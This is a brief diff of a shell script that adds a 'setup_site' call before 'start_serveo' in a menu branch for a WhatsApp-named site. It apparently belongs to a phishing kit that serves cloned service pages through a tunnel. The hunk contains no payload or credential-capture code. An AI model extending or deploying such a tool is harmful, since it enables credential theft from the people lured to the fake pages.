@@ -202,6 +202,7 @@ read -p "$PLAY2" mik
     elif [ "$mik" == "sam whatsapp.net" ]; then
    printf "\n$mik" >> .history/sam_history.dat
    website='whatsapp' 
+   setup_site
    start_serveo
    
       elif [ "$mik" == "sam tiktok.net" ]; then
